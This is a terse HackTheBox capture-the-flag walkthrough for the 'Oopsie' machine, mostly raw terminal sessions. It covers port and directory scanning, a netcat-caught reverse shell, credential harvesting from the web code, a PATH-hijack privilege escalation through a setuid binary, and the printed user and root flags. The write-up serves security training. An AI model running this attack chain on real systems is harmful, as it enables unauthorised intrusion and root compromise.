# Oopsie

## **Thu Mar 20 3:12PM**

```bash
┌──(kali㉿kali)-[~/Desktop/HTB]
└─$ sudo nmap -sC -sV -p- -T4 10.129.120.11
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-20 13:42 EDT
Nmap scan report for 10.129.120.11
Host is up (0.038s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Welcome
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.14 seconds

```

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir --url http://10.129.120.11/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.120.11/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 10932]
/images               (Status: 301) [Size: 315] [--> http://10.129.120.11/images/]
/themes               (Status: 301) [Size: 315] [--> http://10.129.120.11/themes/]
/uploads              (Status: 301) [Size: 316] [--> http://10.129.120.11/uploads/]
/css                  (Status: 301) [Size: 312] [--> http://10.129.120.11/css/]
/js                   (Status: 301) [Size: 311] [--> http://10.129.120.11/js/]

┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.16.58] from (UNKNOWN) [10.129.120.11] 49440
Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 18:37:34 up 57 min,  0 users,  load average: 0.01, 0.03, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@oopsie:/$ 
www-data@oopsie:/var/www/html/cdn-cgi/login$ cat * | grep -i passw*
cat * | grep -i passw*
if($_POST["username"]==="admin" && $_POST["password"]==="MEGACORP_4dm1n!!")
<input type="password" name="password" placeholder="Password" />

www-data@oopsie:/var/www/html/cdn-cgi/login$ 
cat db.php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
www-data@oopsie:/var/www/html/cdn-cgi/login$ su robert
su robert
Password: M3g4C0rpUs3r!

robert@oopsie:/var/www/html/cdn-cgi/login$ ls /home/robert
ls /home/robert
user.txt
robert@oopsie:/var/www/html/cdn-cgi/login$ cat /home/robert/user.txt
cat /home/robert/user.txt
f2c74ee8db7983851ab2a96a44eb7981

robert@oopsie:/var/www/html/cdn-cgi/login$ id
id
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
robert@oopsie:/var/www/html/cdn-cgi/login$ find / -group bugtracker 2>/dev/null
<cdn-cgi/login$ find / -group bugtracker 2>/dev/null
/usr/bin/bugtracker
robert@oopsie:/var/www/html/cdn-cgi/login$ ls -al /usr/bin/bugtracker && file /usr/bin/bugtracker
<-al /usr/bin/bugtracker && file /usr/bin/bugtracker
-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
/usr/bin/bugtracker: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=b87543421344c400a95cbbe34bbc885698b52b8d, not stripped
robert@oopsie:/var/www/html/cdn-cgi/login$ 

robert@oopsie:/tmp$ echo "/bin/sh" > ./cat
echo "/bin/sh" > ./cat
robert@oopsie:/tmp$ chmod +x cat
chmod +x cat
robert@oopsie:/tmp$ export PATH=/tmp:$PATH
export PATH=/tmp:$PATH
robert@oopsie:/tmp$ bugtracker
bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 12
12
---------------

# whoami
whoami
root

# vi /root/root.txt
af13b0bee69f8a877c3faf667f7beacf

```

PWNed